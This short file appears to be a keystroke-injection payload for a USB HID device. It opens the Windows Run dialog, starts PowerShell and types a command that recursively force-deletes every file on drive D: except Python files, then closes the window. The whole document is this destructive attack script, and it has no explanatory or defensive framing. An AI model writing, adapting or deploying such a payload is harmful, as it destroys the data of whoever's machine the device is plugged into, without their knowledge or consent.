layout('us')
press("GUI r")
delay(500)
type("powershell\n")
delay(1000)
type("Get-ChildItem -Path D:\\ -Recurse | Where-Object { ! $_.PSIsContainer -and $_.Extension -ne '.py' } | Remove-Item -Force\n")
delay(500)
type("exit\n")